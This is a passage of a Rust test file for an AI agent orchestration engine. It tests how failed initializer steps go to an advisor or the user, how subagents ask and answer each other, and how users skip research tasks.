    let imp = h.spawn_step("spawn implementer phase 2 initial");
    assert_eq!(
        imp.project, "mcp",
        "the phase starts over inside the new project"
    );
}

#[test]
fn rule_o4_research_in_a_created_project_waits_for_its_init() {
    let mut h = created_by_phase();
    h.ev(SessionEvent::DecisionMade {
        id: DecisionId::new(),
        judge: JudgeKind::Sufficiency,
        subject: Some("late".into()),
        input_summary: String::new(),
        output: json!({"items": [{"item": "x", "needed": true, "reason": "r", "task": {"project": "mcp", "task": "Look at it."}}]}),
        reason: "r".into(),
    });
    assert!(
        !h.summaries().iter().any(|s| s.starts_with("spawn explore")),
        "{:?}",
        h.summaries()
    );
}

#[test]
fn rule_o5_the_advisor_looks_at_a_failed_init_step_first() {
    let mut h = created_by_phase();
    let (detect, _) = h.start("spawn initializer init detect");
    h.finish(
        &detect,
        ExecutionStatus::Stuck,
        Some(json!({"status": "stuck", "summary": "No source", "files": [], "result": {}, "stuck": {"step": "1", "attempted": "a", "diagnostic": "no files", "ruled_out": [], "need": "a stack"}})),
    );
    assert_eq!(mcp_steps(&h), vec!["spawn advisor advise mcp #1"]);
    let advice = h.spawn_step("spawn advisor");
    assert_eq!(advice.inputs.init["Failed step"], "initializer detect");
    assert!(advice.inputs.init["Problem"].contains("a stack"));
    assert!(
        advice.inputs.init["Step result"].contains("\"diagnostic\": \"no files\""),
        "the advisor sees what the step returned"
    );
    h.run(
        "spawn advisor",
        json!({"action": "retry", "guidance": "Plan one slice over the root and seed from the rust reference.", "reason": "The folder is empty."}),
    );
    let again = h.spawn_step("spawn initializer init detect");
    assert_eq!(
        again.inputs.init["Advisor guidance"],
        "Plan one slice over the root and seed from the rust reference."
    );
}

#[test]
fn p4_a_stopped_init_step_goes_to_the_user_not_the_advisor() {
    let mut h = created_by_phase();
    let (detect, _) = h.start("spawn initializer init detect");
    h.finish(&detect, ExecutionStatus::Cancelled, None);
    assert_eq!(mcp_steps(&h), vec!["gate execution_failed"]);
    let Step::OpenGate { title, .. } = h
        .steps()
        .into_iter()
        .find(|s| s.summary() == "gate execution_failed")
        .unwrap()
    else {
        unreachable!()
    };
    assert_eq!(title, "You stopped the initializer");
}

#[test]
fn rule_o5_an_escalation_or_used_up_advice_asks_the_user() {
    let mut h = created_by_phase();
    let fail = |h: &mut H| {
        let (id, _) = h.start("spawn initializer init detect");
        h.finish(&id, ExecutionStatus::Denied, None);
    };
    fail(&mut h);
    h.run(
        "spawn advisor",
        json!({"action": "escalate", "guidance": "", "reason": "It needs a credential."}),
    );
    assert_eq!(mcp_steps(&h), vec!["gate execution_failed"]);
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "retry".into(),
            text: None,
        },
    );
    for round in 1..=ostra_engine::init::MAX_ADVICE {
        fail(&mut h);
        h.run(
            &format!("spawn advisor advise mcp #{round}"),
            json!({"action": "retry", "guidance": format!("try {round}"), "reason": "r"}),
        );
    }
    fail(&mut h);
    assert_eq!(
        mcp_steps(&h),
        vec!["gate execution_failed"],
        "advice is used up"
    );
}

#[test]
fn rule_o5_a_missing_inventory_goes_to_the_advisor() {
    let mut h = created_by_phase();
    let (detect, _) = h.start("spawn initializer init detect");
    h.finish(
        &detect,
        ExecutionStatus::Ok,
        Some(detect_submit(json!([]), json!([]))),
    );
    assert_eq!(mcp_steps(&h), vec!["init-problem mcp"]);
    h.ev(SessionEvent::InitStepFailed {
        project: "mcp".into(),
        execution: detect.clone(),
        error: "Detect found nothing.".into(),
    });
    assert_eq!(mcp_steps(&h), vec!["spawn advisor advise mcp #1"]);
}

#[test]
fn rule_o4_abandoning_a_created_project_init_does_not_fail_the_session() {
    let mut h = created_by_phase();
    let (id, _) = h.start("spawn initializer init detect");
    h.finish(&id, ExecutionStatus::Denied, None);
    h.run(
        "spawn advisor",
        json!({"action": "escalate", "guidance": "", "reason": "r"}),
    );
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "abandon".into(),
            text: None,
        },
    );
    let st = h.state();
    assert!(st.failed.is_none());
    assert!(!st.awaiting_init("mcp"));
    assert!(
        h.summaries()
            .contains(&"spawn implementer phase 2 initial".to_string())
    );
}

// ------------------------------------------------------------------------------------------
// H1 to H9: subagent coordination (HANDOVER 10.8).
// ------------------------------------------------------------------------------------------

use ostra_core::coord::{AskTarget, DeliveryKind};
use ostra_core::ids::MessageId;

impl H {
    fn ask(&mut self, from: &ExecutionId, target: AskTarget, message: &str) -> MessageId {
        let id = MessageId::new();
        self.ev(SessionEvent::AgentAsked {
            id: id.clone(),
            from: from.clone(),
            target,
            message: message.into(),
        });
        id
    }

    fn reply(&mut self, ask: &MessageId, from: &ExecutionId, message: &str) {
        self.ev(SessionEvent::AgentReplied {
            ask: ask.clone(),
            from: from.clone(),
            message: message.into(),
        });
    }

    fn wait(&mut self, id: &ExecutionId) {
        self.finish_with(id, ExecutionStatus::Waiting, None, None);
    }

    fn finish_with(
        &mut self,
        id: &ExecutionId,
        status: ExecutionStatus,
        submit: Option<Value>,
        native_session_id: Option<&str>,
    ) {
        self.ev(SessionEvent::ExecutionFinished {
            id: id.clone(),
            result: ExecutionResult {
                status,
                submit,
                final_text: String::new(),
                usage: Usage::default(),
                native_session_id: native_session_id.map(String::from),
                error: None,
            },
        });
    }

    /// Wake a native run in place the way the runner does: the delivery, then the resume.
    fn wake(&mut self, prefix: &str) -> (ExecutionId, DeliveryKind, String) {
        let req = self.spawn_step(prefix);
        let id = req
            .resumes
            .clone()
            .expect("the spawn wakes a waiting run in place");
        let d = self
            .state()
            .next_delivery(&id)
            .expect("a message waits for the run");
        self.ev(SessionEvent::MessageDelivered {
            ask: d.ask.clone(),
            to: id.clone(),
            kind: d.kind,
        });
        self.ev(SessionEvent::ExecutionResumed { id: id.clone() });
        (id, d.kind, d.note)
    }

    fn start_on(&mut self, prefix: &str, executor: ExecutorKind) -> ExecutionId {
        let req = self.spawn_step(prefix);
        let id = ExecutionId::new();
        self.ev(SessionEvent::ExecutionStarted {
            id: id.clone(),
            agent: req.agent,
            purpose: req.purpose.clone(),
            stage: req.stage,
            project: req.project.clone(),
            executor,
            model: "m".into(),
            params: json!({}),
            spawn_block: String::new(),
            report_path: None,
            resumes: req.continues.clone(),
        });
        id
    }
}

fn spec_written() -> (H, ExecutionId) {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec spec#1");
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    (h, spec)
}

#[test]
fn h5_fact_check_loop_wakes_the_author_and_continues_the_checker() {
    let (mut h, author) = spec_written();
    let (checker, first) = h.start("spawn fact-check fact-check-spec#1");
    assert!(first.continues.is_none(), "the first pass starts fresh");
    h.finish(
        &checker,
        ExecutionStatus::Ok,
        Some(fact("FAIL", "spec", &["R2 cites a missing file"])),
    );
    let revise = h.spawn_step("spawn generate-spec spec#2");
    assert_eq!(
        revise.continues.as_ref(),
        Some(&author),
        "the author is woken with the findings"
    );
    assert!(
        revise
            .inputs
            .findings
            .unwrap()
            .contains("R2 cites a missing file")
    );
    let (rev, _) = h.start("spawn generate-spec spec#2 (continues)");
    h.finish(&rev, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    let recheck = h.spawn_step("spawn fact-check fact-check-spec#2");
    assert_eq!(
        recheck.continues.as_ref(),
        Some(&checker),
        "the same checker re-checks"
    );
    let (re, _) = h.start("spawn fact-check fact-check-spec#2 (continues)");
    let st = h.state();
    assert_eq!(
        st.subagent_of(&rev),
        author,
        "H1: one subagent ID per conversation"
    );
    assert_eq!(st.subagent_of(&re), checker);
    h.finish(&re, ExecutionStatus::Ok, Some(fact("PASS", "spec", &[])));
    assert_eq!(
        h.summaries(),
        vec!["gate spec_approval"],
        "gates are unchanged"
    );
}

#[test]
fn h5_review_loop_continues_the_implementer_and_the_reviewer() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (imp, _) = h.start("spawn implementer phase 1 initial");
    h.finish(
        &imp,
        ExecutionStatus::Ok,
        Some(impl_submit(1, &["src/a.rs"])),
    );
    let (rev, _) = h.start("spawn code-reviewer review phase 1 #1");
    h.finish(
        &rev,
        ExecutionStatus::Ok,
        Some(review(&[finding("HIGH", "C9")])),
    );
    assert_eq!(
        h.spawn_step("spawn implementer phase 1 fix").continues,
        Some(imp)
    );
    h.run(
        "spawn implementer phase 1 fix (continues)",
        impl_submit(1, &["src/a.rs"]),
    );
    assert_eq!(
        h.summaries(),
        vec!["spawn code-reviewer review phase 1 #2 (continues)"]
    );
    assert_eq!(h.spawn_step("spawn code-reviewer").continues, Some(rev));
}

#[test]
fn h6_a_pair_loop_starts_fresh_when_the_conversation_cannot_continue() {
    // The user amended the request after the author's run started.
    let (mut h, _) = spec_written();
    h.run("spawn fact-check", fact("FAIL", "spec", &["x"]));
    h.ev(SessionEvent::RequestAmended {
        text: "Also refunds.".into(),
        files: vec![],
        uploads: vec![],
        delivery: ContextDelivery::Queue,
        routed: false,
    });
    let s = h.summaries();
    assert!(s.iter().all(|x| !x.contains("continues")), "{s:?}");

    // A harness run that left no session id cannot be resumed.
    let mut h = H::explored(&["p"], SessionOptions::default());
    let author = h.start_on(
        "spawn generate-spec spec#1",
        ExecutorKind::Harness(ostra_core::HarnessKind::Codex),
    );
    h.finish_with(&author, ExecutionStatus::Ok, Some(spec_submit(0, 0)), None);
    h.run("spawn fact-check", fact("FAIL", "spec", &["x"]));
    assert_eq!(h.spawn_step("spawn generate-spec spec#2").continues, None);

    // With a session id it continues, on the conversation's executor.
    let mut h = H::explored(&["p"], SessionOptions::default());
    let author = h.start_on(
        "spawn generate-spec spec#1",
        ExecutorKind::Harness(ostra_core::HarnessKind::Codex),
    );
    h.finish_with(
        &author,
        ExecutionStatus::Ok,
        Some(spec_submit(0, 0)),
        Some("sid"),
    );
    h.run("spawn fact-check", fact("FAIL", "spec", &["x"]));
    assert_eq!(
        h.spawn_step("spawn generate-spec spec#2").continues,
        Some(author)
    );
}

#[test]
fn h6_a_conversation_stops_continuing_at_its_run_cap() {
    fn past_recurring_gate(h: &mut H) {
        if h.summaries()
            .contains(&"gate fact_check_recurring".to_string())
        {
            let g = h.open_gate("fact_check_recurring");
            h.answer(
                &g,
                GateAnswer::Choice {
                    option: "another-round".into(),
                    text: None,
                },
            );
        }
    }
    let (mut h, _) = spec_written();
    for n in 2..=ostra_core::coord::MAX_CONVERSATION_RUNS as u32 {
        h.run(
            "spawn fact-check",
            fact("FAIL", "spec", &[&format!("f{n}")]),
        );
        past_recurring_gate(&mut h);
        assert!(
            h.spawn_step("spawn generate-spec").continues.is_some(),
            "round {n} continues"
        );
        h.run("spawn generate-spec", spec_submit(0, 0));
    }
    h.run("spawn fact-check", fact("FAIL", "spec", &["last"]));
    past_recurring_gate(&mut h);
    assert_eq!(
        h.spawn_step("spawn generate-spec").continues,
        None,
        "the author's conversation holds {} runs, so the next round starts fresh",
        ostra_core::coord::MAX_CONVERSATION_RUNS
    );
}

#[test]
fn h2_k3_a_helper_answers_and_the_asker_wakes_in_place() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec spec#1");
    let ask = h.ask(
        &spec,
        AskTarget::Agent {
            agent: AgentName::Explore,
            project: "p".into(),
        },
        "How does the refund service round amounts?",
    );
    h.wait(&spec);
    let st = h.state();
    assert!(st.is_waiting(&spec));
    let s = h.summaries();
    assert_eq!(
        s,
        vec!["spawn explore explore#1"],
        "the stage holds while the author waits"
    );
    let helper = h.spawn_step("spawn explore explore#1");
    assert!(helper.inputs.task.unwrap().contains("round amounts"));
    let (e, _) = h.start("spawn explore explore#1");
    h.finish(&e, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
    let (id, kind, note) = h.wake("spawn generate-spec");
    assert_eq!(id, spec);
    assert_eq!(kind, DeliveryKind::Answer);
    assert!(note.contains("ostra-research-1.md"), "{note}");
    let st = h.state();
    assert!(st.asks[&ask].answer_delivered);
    assert!(!st.is_waiting(&spec));
    assert_eq!(st.spec.runs.len(), 1, "a woken run is the same run");
    assert!(
        h.summaries().is_empty(),
        "the author runs again: {:?}",
        h.summaries()
    );
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    assert_eq!(h.summaries(), vec!["spawn fact-check fact-check-spec#1"]);
}

#[test]
fn h3_a_helper_asks_its_asker_back_and_both_wake_in_turn() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec spec#1");
    h.ask(
        &spec,
        AskTarget::Agent {
            agent: AgentName::Explore,
            project: "p".into(),
        },
        "Research the refund API.",
    );
    h.wait(&spec);
    let (e, _) = h.start("spawn explore explore#1");
    let q = h.ask(
        &e,
        AskTarget::Subagent { id: spec.clone() },
        "Card refunds or all refunds?",
    );
    h.wait(&e);
    let (id, kind, note) = h.wake("spawn generate-spec");
    assert_eq!((id.clone(), kind), (spec.clone(), DeliveryKind::Question));
    assert!(note.contains("Card refunds or all refunds?") && note.contains("SubagentReply"));
    let st = h.state();
    assert_eq!(st.owed_by(&spec).map(|a| a.id.clone()), Some(q.clone()));
    assert!(
        st.ask_event(&spec, &json!({"message": "m", "agent": "explore"}))
            .is_err(),
        "H4: reply first"
    );
    h.reply(&q, &spec, "Card refunds only.");
    h.wait(&spec);
    let (id, kind, note) = h.wake("spawn explore explore#1");
    assert_eq!((id, kind), (e.clone(), DeliveryKind::Answer));
    assert!(note.contains("Card refunds only."));
    assert!(
        h.state().is_waiting(&spec),
        "the author still waits for the research"
    );
    h.finish(&e, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
    assert_eq!(h.wake("spawn generate-spec").1, DeliveryKind::Answer);
}

#[test]
fn h3_a_subagent_that_ended_answers_in_a_consult_run() {
    let (mut h, author) = spec_written();
    let (checker, _) = h.start("spawn fact-check fact-check-spec#1");
    let q = h.ask(
        &checker,
        AskTarget::Subagent { id: author.clone() },
        "Where does R2 come from?",
    );
    h.wait(&checker);
    assert_eq!(
        h.summaries(),
        vec!["spawn generate-spec consult (continues)"]
    );
    let consult = h.spawn_step("spawn generate-spec consult");
    assert_eq!(consult.continues, Some(author.clone()));
    assert_eq!(consult.stage, StageKind::Spec);
    let (c, _) = h.start("spawn generate-spec consult");
    let st = h.state();
    assert_eq!(st.subagent_of(&c), author);
    assert!(
        st.ask_event(
            &c,
            &json!({"message": "m", "subagent_id": checker.as_str()})
        )
        .is_err(),
        "H4: a consult run does not ask"
    );
    let (event, end) = st
        .reply_event(&c, &json!({"message": "From the research doc."}))
        .unwrap();
    assert_eq!(end, ostra_core::coord::RunEnd::Finish);
    h.ev(event);
    h.finish(
        &c,
        ExecutionStatus::Ok,
        Some(json!({"coordination": "SubagentReply"})),
    );
    let (id, kind, note) = h.wake("spawn fact-check");
    assert_eq!((id, kind), (checker.clone(), DeliveryKind::Answer));
    assert!(note.contains("From the research doc."));
    assert!(h.state().asks[&q].answer_delivered);
    // The next round of the author continues from the consult run, its latest.
    h.finish(
        &checker,
        ExecutionStatus::Ok,
        Some(fact("FAIL", "spec", &["x"])),
    );
    assert_eq!(
        h.spawn_step("spawn generate-spec spec#2").continues,
        Some(c)
    );
}

#[test]
fn h3_a_failed_subagent_answers_with_its_failure() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (author, _) = h.start("spawn generate-spec spec#1");
    h.finish(&author, ExecutionStatus::Error, None);
    let (spec2, _) = h.start("spawn generate-spec spec#2");
    let ask = h.ask(&spec2, AskTarget::Subagent { id: author.clone() }, "Why?");
    h.wait(&spec2);
    let st = h.state();
    assert!(
        st.effective_answer(&st.asks[&ask])
            .unwrap()
            .contains("cannot answer")
    );
    let (id, kind, _) = h.wake("spawn generate-spec");
    assert_eq!((id, kind), (spec2, DeliveryKind::Answer));
}

#[test]
fn h3_a_question_to_a_busy_subagent_waits() {
    let mut h = H::new(&["p", "q"], SessionOptions::default());
    h.classify("RESEARCH", &["p", "q"]);
    let (a, _) = h.start("spawn explore explore#0");
    let (b, _) = h.start("spawn explore explore#1");
    h.ask(
        &a,
        AskTarget::Subagent { id: b.clone() },
        "What did you find in q?",
    );
    h.wait(&a);
    assert!(
        h.summaries().is_empty(),
        "b is running: {:?}",
        h.summaries()
    );
    h.finish(&b, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
    assert_eq!(h.summaries(), vec!["spawn explore consult (continues)"]);
}

#[test]
fn h2_a_harness_run_waits_alive_and_gets_a_delivery() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let spec = h.start_on(
        "spawn generate-spec spec#1",
        ExecutorKind::Harness(ostra_core::HarnessKind::Claude),
    );
    h.ask(
        &spec,
        AskTarget::Agent {
            agent: AgentName::Explore,
            project: "p".into(),
        },
        "Research X.",
    );
    assert!(h.state().is_waiting(&spec), "alive and waiting");
    let (e, _) = h.start("spawn explore explore#1");
    h.finish(&e, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
    assert_eq!(h.summaries(), vec!["deliver answer"]);
    let d = h.state().next_delivery(&spec).unwrap();
    h.ev(SessionEvent::MessageDelivered {
        ask: d.ask,
        to: spec.clone(),
        kind: d.kind,
    });
    assert!(h.summaries().is_empty());
    assert!(!h.state().is_waiting(&spec));
}

#[test]
fn h4_asks_are_bounded() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec spec#1");
    let helper = |p: &str| json!({"message": "m", "agent": "explore", "project": p});
    let st = h.state();
    assert!(
        st.ask_event(&spec, &json!({"message": "m", "agent": "implementer"}))
            .is_err()
    );
    assert!(
        st.ask_event(&spec, &helper("nope")).is_err(),
        "unknown project"
    );
    assert!(
        st.ask_event(
            &spec,
            &json!({"message": "m", "subagent_id": spec.as_str()})
        )
        .is_err(),
        "not yourself"
    );
    assert!(
        st.ask_event(&spec, &json!({"message": "m", "subagent_id": "x_none"}))
            .is_err()
    );
    assert!(
        st.reply_event(&spec, &json!({"message": "m"})).is_err(),
        "nothing to reply to"
    );
    for _ in 0..ostra_core::coord::MAX_HELPERS_PER_RUN {
        let (e, _) = h.state().ask_event(&spec, &helper("p")).unwrap();
        h.ev(e);
    }
    assert!(
        h.state().ask_event(&spec, &helper("p")).is_err(),
        "helper cap"
    );
    let (e, _) = h.start("spawn explore explore#1");
    let err = h.state().ask_event(&e, &helper("p")).unwrap_err();
    assert!(err.contains("helper may not start helpers"), "{err}");
}

#[test]
fn h9_a_waiting_subagent_holds_completion() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("RESEARCH", &["p"]);
    let (a, _) = h.start("spawn explore explore#0");
    h.ask(
        &a,
        AskTarget::Agent {
            agent: AgentName::Explore,
            project: "p".into(),
        },
        "More on X.",
    );
    h.wait(&a);
    assert!(h.state().coordination_open());
    let s = h.summaries();
    assert!(!s.iter().any(|x| x.contains("completion")), "{s:?}");
}

// ------------------------------------------------------------------------------------------
// U1: the user skips a task the session can do without; it ends without a result.
// ------------------------------------------------------------------------------------------

fn skip(h: &mut H, id: &ExecutionId) {
    h.ev(SessionEvent::ExecutionSkipped { id: id.clone() });
}

#[test]
fn u1_skipped_research_stops_and_never_reruns() {
    let mut h = H::new(
        &["a", "b"],
        SessionOptions {
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    h.classify("IMPLEMENT", &["a", "b"]);
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    let (research, _) = h.start("spawn explore explore#1");
    assert!(h.state().can_skip(&research));
    skip(&mut h, &research);
    let st = h.state();
    assert_eq!(
        st.interrupting.get(&research),
        Some(&ostra_engine::state::Interrupt::Skipped)
    );
    assert!(!st.can_skip(&research), "a skipped task is skipped once");
    // Rule D2 no longer waits for it, and the stop opens no failure gate.
    let spec = h.spawn_step("spawn generate-spec");
    assert_eq!(spec.inputs.research_docs.len(), 1);
    h.finish(&research, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
}

#[test]
fn u1_work_and_checks_cannot_be_skipped() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    assert!(!h.state().can_skip(&spec));
    skip(&mut h, &spec);
    assert!(h.state().interrupting.is_empty(), "the fold ignores it");
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    assert_eq!(h.summaries(), vec!["spawn fact-check fact-check-spec#1"]);
}

#[test]
fn u1_a_skipped_test_analysis_skips_that_phase_tests() {
    let phases = json!([
        phase(1, "p", &[], "Required"),
        phase(2, "p", &[1], "Required")
    ]);
    let mut h = H::plan_approved(
        &["p"],
        phases,
        SessionOptions {
            tests: true,
            docs: true,
            yolo: false,
            track: None,
        },
    );
    h.pass_phase(1);
    h.pass_phase(2);
    h.accept();
    h.command(CommandPurpose::Format, "p");
    let (e1, _) = h.start("spawn execution-path-analyzer epa phase 1");
    let (e2, _) = h.start("spawn execution-path-analyzer epa phase 2");
    skip(&mut h, &e1);
    h.finish(&e1, ExecutionStatus::Interrupted, None);
    h.finish(&e2, ExecutionStatus::Ok, Some(report("/e2")));
    assert_eq!(
        h.summaries(),
        vec!["spawn write-test write-test phase 2 initial"]
    );
}

#[test]
fn u1_context_can_skip_running_and_queued_research() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Classify,
        None,
        json!({"category": "IMPLEMENT", "projects": ["p"], "explore_tasks": [
            {"project": "p", "task": "research the order model"},
            {"project": "p", "task": "research the retry backoff"},
            {"project": "p", "task": "research the deadpool errors"}
        ], "opts_in": {"tests": false, "docs": false}, "reason": "r"}),
    );
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    let (backoff, _) = h.start("spawn explore explore#1");
    amend(
        &mut h,
        "skip the backoff and deadpool research",
        vec![],
        ContextDelivery::Now,
    );
    assert!(h.state().interrupting.contains_key(&backoff));
    h.finish(&backoff, ExecutionStatus::Interrupted, None);
    route_amendment(
        &mut h,
        0,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard"}], "research": [], "skip": [2, 3], "reason": "r"}),
    );
    let st = h.state();
    assert!(
        st.explore[1].abandoned,
        "the interrupted task does not re-run"
    );
    assert!(st.explore[2].abandoned, "the queued task never starts");
    assert_eq!(h.summaries(), vec!["judge track"]);
}

#[test]
fn u1_queued_context_skips_research_once_running_work_finishes() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Classify,
        None,
        json!({"category": "IMPLEMENT", "projects": ["p"], "explore_tasks": [
            {"project": "p", "task": "research the order model"},
            {"project": "p", "task": "research the deadpool errors"}
        ], "opts_in": {"tests": false, "docs": false}, "reason": "r"}),
    );
    let (order, _) = h.start("spawn explore explore#0");
    amend(
        &mut h,
        "skip the deadpool research",
        vec![],
        ContextDelivery::Queue,
    );
    // Rule C2: the queued context holds back the next research until the running one finishes.
    assert!(h.summaries().is_empty(), "{:?}", h.summaries());
    h.finish(&order, ExecutionStatus::Ok, Some(explore_submit(0, &[])));
    route_amendment(
        &mut h,
        0,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard"}], "research": [], "skip": [2], "reason": "r"}),
    );
    assert!(
        h.state().explore[1].abandoned,
        "the held-back task never starts"
    );
    assert_eq!(h.summaries(), vec!["judge track"]);
}

#[test]
fn d2_one_sufficiency_round_adds_at_most_three_tasks() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("IMPLEMENT", &["p"]);
    h.run(
        "spawn explore explore#0",
        explore_submit(0, &["a", "b", "c", "d", "e"]),
    );
    let items: Vec<Value> = ["a", "b", "c", "d", "e"]
        .iter()
        .map(|i| json!({"item": i, "needed": true, "reason": "r", "task": {"project": "p", "task": format!("research {i}")}}))
        .collect();
    h.decide(
        JudgeKind::Sufficiency,
        Some("0"),
        json!({"items": items, "reason": "r"}),
    );
    assert_eq!(
        h.summaries(),
        vec![
            "spawn explore explore#1",
            "spawn explore explore#2",
            "spawn explore explore#3"
        ]
    );
}
